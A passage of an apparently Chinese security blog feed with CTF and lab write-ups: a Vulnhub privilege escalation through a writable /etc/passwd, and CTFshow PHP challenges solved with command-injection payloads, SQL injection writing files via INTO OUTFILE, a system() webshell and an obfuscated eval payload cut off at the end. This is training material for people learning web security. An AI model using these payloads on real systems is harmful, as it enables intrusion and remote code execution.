data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718174234130.png\" alt=\"image-20230718174234130\"></p>\n<p>但是这里还有一个密码，这里尝试爆破一下</p>\n<p>现将文件转化为john能够识别的格式</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718175342641.png\" alt=\"image-20230718175342641\"></p>\n<p>这里使用john破解</p>\n<pre><code class=\"perl\">john 1 --wordlist=rockyou.txt \n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718180455776.png\" alt=\"image-20230718180455776\"></p>\n<p>PS:这份密码文档是哪来的请看下图详解</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718180538256.png\" alt=\"image-20230718180538256\"></p>\n<p>再去连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718182712927.png\" alt=\"image-20230718182712927\"></p>\n<p>这里就成功拿到一个shell</p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>接下来就是提权到root</p>\n<pre><code class=\"perl\">find / -writable 2&gt;/dev/null\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718183430018.png\" alt=\"image-20230718183430018\"></p>\n<p>这里在进一步信息收集的过程中发现，当前用户对&#x2F;etc&#x2F;passwd文件是有可写的权限的，很显然这是不合理的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718183611167.png\" alt=\"image-20230718183611167\"></p>\n<p>这里看到所有的用户都是可以改写这个文件的，这里就可以更改root用户的密码</p>\n<p>先生成一个新的密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718185043888.png\" alt=\"image-20230718185043888\"></p>\n<p>将这个密码写到passwd文件中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718185028407.png\" alt=\"image-20230718185028407\"></p>\n<p>su</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718185149905.png\" alt=\"image-20230718185149905\"></p>\n",
            "tags": [
                "Vulnhub",
                "Vulnhub"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/17/%E5%85%B6%E4%BB%96php%E7%AF%87/",
            "url": "https://blog.xcu.icu/2023/07/17/%E5%85%B6%E4%BB%96php%E7%AF%87/",
            "title": "CTFshow-web入门其他",
            "date_published": "2023-07-16T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>做做靶机，刷刷ctfshow，暑假颓废的一天，本篇记录ctfshow其他的php篇解题过程</p>\n<h2 id=\"Web396\"><a href=\"#Web396\" class=\"headerlink\" title=\"Web396\"></a>Web396</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; &#39;.$url[&#39;path&#39;]);\n\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<p>题目中说到特定函数绕过，看到源码那必然就是parse_url的绕过咯，下面看一下官方文档中parse_url函数的示例</p>\n<pre><code class=\"php\">&lt;?php\n$url = &#39;//www.example.com/path?googleguy=googley&#39;;\n\n// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;\nvar_dump(parse_url($url));\n?&gt;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716091046387.png\" alt=\"image-20230716091046387\"></p>\n<p>那么就很简单咯，这里使用反引号执行命令，将结果放到path指向的文件中就可以了</p>\n<p>payload1：</p>\n<pre><code class=\"perl\">?url=http://`ls`/var/www/html/1.txt\n</code></pre>\n<p>直接去访问1.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716091401261.png\" alt=\"image-20230716091401261\"></p>\n<p>payload2：</p>\n<pre><code class=\"perl\">/?url=http://`cat%20fl0g.php`/var/www/html/1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716091540195.png\" alt=\"image-20230716091540195\"></p>\n<h2 id=\"Web397\"><a href=\"#Web397\" class=\"headerlink\" title=\"Web397\"></a>Web397</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);\n\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<p>比起上一题加了一点限制，路径写死在&#x2F;tmp下面，这里简单的命令注入</p>\n<pre><code class=\"perl\">?url=http://1/1;echo%20`ls`&gt;/var/www/html/1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716093947563.png\" alt=\"image-20230716093947563\"></p>\n<p>然后直接读取flag</p>\n<pre><code class=\"perl\">?url=http://1/1;echo%20`cat%20f*`&gt;/var/www/html/1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716094031177.png\" alt=\"image-20230716094031177\"></p>\n<h2 id=\"Web398\"><a href=\"#Web398\" class=\"headerlink\" title=\"Web398\"></a>Web398</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    if(!preg_match(&#39;/;/&#39;, $url[&#39;host&#39;]))&#123;\n        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);\n    &#125;\n\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<p>比起上一题又加了一些限制，但是限制是在host指向的部分，所以这里直接用上一题的payload即可</p>\n<pre><code class=\"perl\">?url=http://1/;echo%20`cat%20f*`&gt;/var/www/html/1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230716094835719.png\" alt=\"image-20230716094835719\"></p>\n<h2 id=\"Web399\"><a href=\"#Web399\" class=\"headerlink\" title=\"Web399\"></a>Web399</h2><pre><code class=\"php\">&lt;?php\n\nerror_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    if(!preg_match(&#39;/;|&gt;/&#39;, $url[&#39;host&#39;]))&#123;\n        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);\n    &#125;\n\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<p>还是对host指向的部分做限制，这里还是用上一题的payload</p>\n<h2 id=\"Web402\"><a href=\"#Web402\" class=\"headerlink\" title=\"Web402\"></a>Web402</h2><pre><code class=\"php\">&lt;?php\n#error_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    var_dump($url);\n    if(preg_match(&#39;/http|https/i&#39;, $url[&#39;scheme&#39;]))&#123;\n        die(&#39;error&#39;);\n    &#125;\n    if(!preg_match(&#39;/;|&gt;|\\||base/i&#39;, $url[&#39;host&#39;]))&#123;\n        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);\n    &#125;\n\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<p> 这里的 $url[&#39;scheme&#39;]指向的是传入url的协议，这里限制了是http，并且对host指向做了限制，接着用上面的payload即可</p>\n<h2 id=\"Web403\"><a href=\"#Web403\" class=\"headerlink\" title=\"Web403\"></a>Web403</h2><pre><code class=\"php\">&lt;?php\n\nerror_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    if(preg_match(&#39;/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/&#39;, $url[&#39;host&#39;]))&#123;\n        shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);\n    &#125;\n\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<p>这里对host部分做了匹配，这里只需要构造一个ip即可</p>\n<pre><code class=\"perl\">/?url=http://127.0.0.1/;echo `ls` &gt;1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717080707237.png\" alt=\"image-20230717080707237\"></p>\n<p>接着去读取flag即可</p>\n<pre><code class=\"perl\">/?url=http://127.0.0.1/;echo `cat f*` &gt;1.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717080754578.png\" alt=\"image-20230717080754578\"></p>\n<h2 id=\"Web404\"><a href=\"#Web404\" class=\"headerlink\" title=\"Web404\"></a>Web404</h2><p>这里有点搞，我一直以为环境没起来，原来是要访问404.php</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    if(preg_match(&#39;/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./&#39;, $url[&#39;host&#39;]))&#123;\n        if(preg_match(&#39;/^\\/[A-Za-z0-9]+$/&#39;, $url[&#39;path&#39;]))&#123;\n            shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);\n        &#125;\n    &#125;\n\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n</code></pre>\n<p>这里host匹配正则改了，没有了前面的 ^,表示前面部分就是可控的了</p>\n<pre><code>?url=php://;echo `ls` &gt;1.txt;1.1.1.11/1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717084207416.png\" alt=\"image-20230717084207416\"></p>\n<p>用上面这个命令注入的payload来注入</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717084257114.png\" alt=\"image-20230717084257114\"></p>\n<p>接着打开这个fl0g.php文件即可</p>\n<pre><code class=\"php\">?url=php://;echo `cat f*` &gt;1.txt;1.1.1.11/1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717084414005.png\" alt=\"image-20230717084414005\"></p>\n<h2 id=\"Web405\"><a href=\"#Web405\" class=\"headerlink\" title=\"Web405\"></a>Web405</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;url&#39;]))&#123;\n    $url = parse_url($_GET[&#39;url&#39;]);\n    if(preg_match(&#39;/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./&#39;, $url[&#39;host&#39;]))&#123;\n        if(preg_match(&#39;/^\\/[A-Za-z0-9]+$/&#39;, $url[&#39;path&#39;]))&#123;\n            if(preg_match(&#39;/\\~|\\.|php/&#39;, $url[&#39;scheme&#39;]))&#123;\n                shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);\n            &#125;   \n        &#125;\n    &#125;\n&#125;else&#123;\n    highlight_file(__FILE__);\n    echo &#39;parse_url 好强大&#39;;\n&#125;\n</code></pre>\n<p>上一题的payload直接做就行</p>\n<h2 id=\"Web406\"><a href=\"#Web406\" class=\"headerlink\" title=\"Web406\"></a>Web406</h2><pre><code class=\"php\">&lt;?php\nrequire &#39;config.php&#39;;\n//flag in db\nhighlight_file(__FILE__);\n$url=$_GET[&#39;url&#39;];\nif(filter_var ($url,FILTER_VALIDATE_URL))&#123;\n    $sql = &quot;select * from links where url =&#39;&#123;$url&#125;&#39;&quot;;\n    $result = $conn-&gt;query($sql);\n&#125;else&#123;\n    echo &#39;不通过&#39;;\n&#125;\n</code></pre>\n<p>这次不是parse_url函数了，这里使用的是filter_var这个过滤器，FILTER_VALIDATE_URL这个过滤器的ID会将值当做URl来验证，很显然这题考察的就是有关filter_var的注入，在url中字符“;”, “&#x2F;”, “?”, “:”, “@”, “&#x3D;” 和 “&amp;” 被定义为保留字符</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717110929242.png\" alt=\"image-20230717110929242\"></p>\n<p>结合提示flag在db中，这里因为没有回显，将查询结果写入文件中</p>\n<pre><code class=\"php\">&lt;?php \nrequire &#39;config.php&#39;;\n$sql =&#39;select flag from flag into outfile &quot;/var/www/html/1.txt&quot;&#39;;\n$result = $conn-&gt;query($sql);\nvar_dump($result); \n?&gt;\n转为16进制\n?url=0://www.baidu.com;&#39;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/&quot;/var/www/html/1.php&quot;%23\n</code></pre>\n<p>先访问1.php，再访问1.txt即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717111547865.png\" alt=\"image-20230717111547865\"></p>\n<h2 id=\"Web407\"><a href=\"#Web407\" class=\"headerlink\" title=\"Web407\"></a>Web407</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$ip=$_GET[&#39;ip&#39;];\n\nif(filter_var ($ip,FILTER_VALIDATE_IP))&#123;\n    call_user_func($ip);\n&#125;\n\nclass cafe&#123;\n    public static function add()&#123;\n        echo file_get_contents(&#39;flag.php&#39;);\n    &#125;\n&#125;\n</code></pre>\n<p>FILTER_VALIDATE_IP这个过滤器是验证IP地址的，验证成功调用了call_user_func来调用一个回调函数，这里只要调用cafe类的add函数即可，这里直接使用IPV6格式来绕过即可</p>\n<pre><code class=\"perl\">?ip=cafe::add\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717112553265.png\" alt=\"image-20230717112553265\"></p>\n<h2 id=\"Web408\"><a href=\"#Web408\" class=\"headerlink\" title=\"Web408\"></a>Web408</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$email=$_GET[&#39;email&#39;];\n\nif(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;\n    file_put_contents(explode(&#39;@&#39;, $email)[1], explode(&#39;@&#39;, $email)[0]);\n&#125;\n</code></pre>\n<p>这个题是邮箱的一个验证，这里改一下原代码，去验证一下，传入的内容</p>\n<pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$email=$_GET[&#39;email&#39;];\n\nif(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;\n    var_dump(explode(&#39;@&#39;, $email)[1], explode(&#39;@&#39;, $email)[0]);\n&#125;\nelse&#123;\n    echo &quot;Invalid email&quot;;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717113002984.png\" alt=\"image-20230717113002984\"></p>\n<p>简单的测试后发现”&quot;,”[]”,”()”和”&lt;&gt;”是不能放在邮箱@前缀中的，但是想要写马尖括号必须要使用，这里可以使用引号来绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717113710945.png\" alt=\"image-20230717113710945\"></p>\n<p>这里看不到是因为被识别为标签了，这里去写马rce即可</p>\n<pre><code class=\"perl\">?email=&quot;&lt;?=system($_GET[1])?&gt;&quot;@1.php\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717114115775.png\" alt=\"image-20230717114115775\"></p>\n<h2 id=\"Web409\"><a href=\"#Web409\" class=\"headerlink\" title=\"Web409\"></a>Web409</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$email=$_GET[&#39;email&#39;];\nif(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;\n    $email=preg_replace(&#39;/.flag/&#39;, &#39;&#39;, $email);\n    eval($email);\n&#125;\n</code></pre>\n<p>这题有个替换flag和他前面的字符为空，这里还是上一题的思路，因为这里是直接通过eval代码执行，如果用两个引号包裹会被识别为一个字符串不被执行，所以这里利用替换将前一个引号替换为空将后一个引号注释掉，可以看下面这个例子</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717115317227.png\" alt=\"image-20230717115317227\"></p>\n<p>这些知道后payload就很简单</p>\n<pre><code class=\"perl\">?email=&quot;flagsystem($_GET[1]);//&quot;@a.b&amp;1=cat /flag\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717115914428.png\" alt=\"image-20230717115914428\"></p>\n<h2 id=\"Web410\"><a href=\"#Web410\" class=\"headerlink\" title=\"Web410\"></a>Web410</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(&#39;flag.php&#39;);\n$b=$_GET[&#39;b&#39;];\nif(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;\n    if($b==&#39;true&#39; || intval($b)&gt;0)&#123;\n        die(&#39;FLAG NOT HERE&#39;);\n    &#125;else&#123;\n        echo $flag;\n    &#125;\n&#125;\n</code></pre>\n<p>FILTER_VALIDATE_BOOLEAN这个过滤器验证为布尔类型，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9maWx0ZXJfdmFsaWRhdGVfYm9vbGVhbi5hc3A=\">PHP FILTER_VALIDATE_BOOLEAN 过滤器 (w3school.com.cn)</span>这里可以参考一下</p>\n<ul>\n<li>如果是 “1”, “true”, “on” 以及 “yes”，则返回 true。</li>\n<li>如果是 “0”, “false”, “off”, “no” 以及 “”，则返回 false。</li>\n<li>否则返回 NULL。</li>\n</ul>\n<p>这里第二个if判断不能为true也不能为1，这里使用yes或者on就行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717120621137.png\" alt=\"image-20230717120621137\"></p>\n<h2 id=\"Web411\"><a href=\"#Web411\" class=\"headerlink\" title=\"Web411\"></a>Web411</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(&#39;flag.php&#39;);\n$b=$_GET[&#39;b&#39;];\nif(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;\n    if($b==&#39;true&#39; || intval($b)&gt;0 ||$b==&#39;on&#39; || $b==&#39;ON&#39;)&#123;\n        die(&#39;FLAG NOT HERE&#39;);\n    &#125;else&#123;\n        echo $flag;\n    &#125;\n&#125;\n</code></pre>\n<p>和上一题一样，多了一个no的限制，这里使用yes即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717121844974.png\" alt=\"image-20230717121844974\"></p>\n<h2 id=\"Web412\"><a href=\"#Web412\" class=\"headerlink\" title=\"Web412\"></a>Web412</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\n$ctfshow=$_POST[&#39;ctfshow&#39;];\nif(isset($ctfshow))&#123;\n    file_put_contents(&#39;flag.php&#39;, &#39;//&#39;.$ctfshow,FILE_APPEND);\n    include(&#39;flag.php&#39;);\n&#125;\n</code></pre>\n<p>这题考察file_put_contents函数，这个中的FILE_APPEND防止删除原有文件内容，这里拼接进去的内容会用&#x2F;&#x2F;注释掉，这里使用%0a绕过即可</p>\n<pre><code>ctfshow=%0ahighlight_file(__FILE__);\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717124234765.png\" alt=\"image-20230717124234765\"></p>\n<h2 id=\"Web413\"><a href=\"#Web413\" class=\"headerlink\" title=\"Web413\"></a>Web413</h2><pre><code class=\"php\">&lt;?php\n\nhighlight_file(__FILE__);\n\n$ctfshow=$_POST[&#39;ctfshow&#39;];\n\nif(isset($ctfshow))&#123;\n        file_put_contents(&#39;flag.php&#39;, &#39;/*&#39;.$ctfshow.&#39;*/&#39;,FILE_APPEND);\n    include(&#39;flag.php&#39;);\n&#125;\n</code></pre>\n<p>这里使用 &#x2F;**&#x2F;的方法注释防止换行的绕过，只需要将前后都闭合即可</p>\n<pre><code class=\"perl\">ctfshow=*/highlight_file(__FILE__);/*\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717124639168.png\" alt=\"image-20230717124639168\"></p>\n<h2 id=\"Web414\"><a href=\"#Web414\" class=\"headerlink\" title=\"Web414\"></a>Web414</h2><pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\ninclude(&#39;flag.php&#39;);\n$ctfshow=$_GET[&#39;ctfshow&#39;];\n\nif($ctfshow==true)&#123;\n    if(sqrt($ctfshow)&gt;=sqrt(intval($flag)))&#123;\n        echo &#39;FLAG_NOT_HERE&#39;;\n    &#125;else&#123;\n        echo $flag;\n    &#125;\n&#125;\n</code></pre>\n<p>这里等于true没什么用，任意字符串都能满足，这里传入一个负数即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717141633657.png\" alt=\"image-20230717141633657\"></p>\n<h2 id=\"Web415\"><a href=\"#Web415\" class=\"headerlink\" title=\"Web415\"></a>Web415</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$k = $_GET[k];\n\nfunction getflag()&#123;\n    echo file_get_contents(&#39;flag.php&#39;);\n&#125;\n\nif($k==&#39;getflag&#39;)&#123;\n    die(&#39;FLAG_NOT_HERE&#39;);\n&#125;else&#123;\n    call_user_func($k);\n&#125;\n</code></pre>\n<p>这里先判断如果k等于getflag就异常退出，这里最后又要调用getflag，这里因为使用的是两个等号判断，所以这里直接用大写绕过即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717160437167.png\" alt=\"image-20230717160437167\"></p>\n<h2 id=\"Web416\"><a href=\"#Web416\" class=\"headerlink\" title=\"Web416\"></a>Web416</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctf&#123;\n    public function getflag()&#123;\n        return &#39;fake flag&#39;;\n    &#125;\n    final public function flag()&#123;\n        echo file_get_contents(&#39;flag.php&#39;);\n    &#125;\n&#125;\n\nclass show extends ctf&#123;\n    public function __construct($f)&#123;\n        call_user_func($f);\n    &#125;\n&#125;\n\necho new show($_GET[f]);\n</code></pre>\n<p>这里show类继承与ctf类，这里直接去调用ctf的flag方法即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717182612438.png\" alt=\"image-20230717182612438\"></p>\n<h2 id=\"Web417\"><a href=\"#Web417\" class=\"headerlink\" title=\"Web417\"></a>Web417</h2><p>这里有一个附件先下载下来</p>\n<pre><code class=\"php\">&lt;?php /*ctfshow*/define(&#39;aPeKTP0126&#39;,__FILE__);$cIYMfW=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$CBhSfw=$cIYMfW[3].$cIYMfW[6].$cIYMfW[33].$cIYMfW[30];$xWoIVy=$cIYMfW[33].$cIYMfW[10].$cIYMfW[24].$cIYMfW[10].$cIYMfW[24];$RkEEuV=$xWoIVy[0].$cIYMfW[18].$cIYMfW[3].$xWoIVy[0].$xWoIVy[1].$cIYMfW[24];$YFfKrW=$cIYMfW[7].$cIYMfW[13];$CBhSfw.=$cIYMfW[22].$cIYMfW[36].$cIYMfW[29].$cIYMfW[26].$cIYMfW[30].$cIYMfW[32].$cIYMfW[35].$cIYMfW[26].$cIYMfW[30];eval($CBhSfw(&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3d